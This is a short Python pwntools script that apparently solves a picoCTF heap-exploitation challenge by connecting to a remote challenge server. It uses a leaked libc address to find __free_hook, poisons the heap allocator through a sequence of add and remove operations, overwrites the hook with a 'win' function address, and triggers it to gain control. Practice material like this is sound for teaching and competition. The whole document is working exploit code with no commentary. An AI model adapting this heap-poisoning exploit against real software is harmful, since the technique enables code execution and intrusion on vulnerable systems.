from pwn import *

# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'fickle-tempest.picoctf.net', 60083
r = remote(HOST, PORT)

def add(size, payload):
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', size)
    r.sendlineafter('> ', payload)

def remove(index):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', str(index))

win = 0x400a02

r.sendlineafter('hero?\n', 'y')
r.recvuntil('Take this: ')
sys_libc = int(r.recvline().decode().strip(), 16)

libc = sys_libc - 0x52fd0
free_hook = libc + 0x1e75a8

add(f'{0x408}', 'A' * 0x408)
add(f'{0x100}', 'B' * 0x100)
remove(1)
remove(0)
add(f'{0x408}', 'A' * 0x408)
remove(1)
add(f'{0x100}', p64(free_hook))
add(f'{0xf8}', 'C')
add(f'{0xf8}', p64(win))
remove(0)

r.interactive()